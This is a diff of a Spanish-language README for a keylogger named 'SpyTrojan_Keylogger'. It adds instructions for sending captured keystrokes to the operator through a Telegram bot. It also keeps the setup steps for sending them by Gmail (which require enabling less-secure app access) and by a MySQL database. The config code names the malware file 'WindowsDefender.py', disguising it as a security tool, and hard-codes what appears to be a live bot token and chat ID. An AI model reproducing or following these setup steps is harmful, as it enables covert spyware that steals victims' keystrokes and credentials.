@@ -129,7 +129,7 @@ NOTA: Biblioteca no optimizada! :'(
     ```` 
 
 
-## Envió Mediante Gmail
+## [Configuración] Gmail
 1. Es de suma urgencia habilitar el acceso a apps menos seguras de google, la cual lo puedes hacer desde éste [link](https://myaccount.google.com/lesssecureapps).  `En caso no lo habilites, el keylogger no podrá iniciar sesión en su Gmail`
 2. Use  `git clone https://github.com/SebastianEPH/SpyTrojan_Keylogger.git` para descargar el repositorio en su computadora.
 
@@ -160,7 +160,7 @@ def timeSend(): # Tiempo de envío perzonalizado
     return 120 #Minutos                 <= Escoja su tiempo en minutos
 ````
 
-## Envío mediante Base de Datos |MySQL|
+## [Configuración] Database MySQL
 
 1. Debes crearte una cuenta gratuita en [CleverCloud](https://www.clever-cloud.com/en/), cabe destacar que solo tenemos 10MB de almacenamiento, se recomienda, vaciar los datos cada vez que podamos, o utilizar otra base de datos.
 
@@ -236,6 +236,42 @@ def timeSend(): # Tiempo de envío perzonalizado
     ![Fin](https://i.imgur.com/X4MxCeA.png)
 
     ![Fin](https://i.imgur.com/axhHVlF.png)
+
+# [Configuración] BotTelegram
+
+1. Entramos a [BotFather](https://telegram.me/BotFather) y creamos un nuevo bot.
+
+  ![botFather](https://i.imgur.com/1dtdBO6.png)
+
+2. Obtenemos nuetro token 
+
+  ![](https://i.imgur.com/oRYutuu.png)
+
+3. Ahora obtenemos nuestro `Chat ID`, esto se realiza para que solo el registro de teclas nos llegue a nosotros y no a cualquiera que encuentre el bot.
+
+4. Buscamos el Bot llamado [Chat ID Echo](https://telegram.me/chatid_echo_bot) y obtenemos nuestro Chat ID
+    
+    ![CHAT ID](https://i.imgur.com/tJttP3i.png)
+
+5. Ya tenemos nuestro `Token del bot` y nuestro `Chat ID` ahora tenemos que abrir nuestro archivo `WindowsDefender.py` y colocar esos datos en las siguientes funciones:
+
+    ````py
+    def SendMode():
+    return 2    # 0 = Gmail
+                # 1 = DataBase              # Solo se puede usar una opción
+                # 2 = TelegramBot
+                
+    # ************ Zone Telegram *************     
+    def ID():
+        return 831756903            # <=  ID de chat telegram [Nota] no lo coloque entre comillas
+
+    def Token():
+        return "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"    # Token del Bot del Telegram
+
+    # ************ Zona Telegram ************* 
+    ````
+
+
 
 # [Si usted desea modificar el keylogger lea la siguiente documentación aquí.](Doc/CustomKey.md)
 
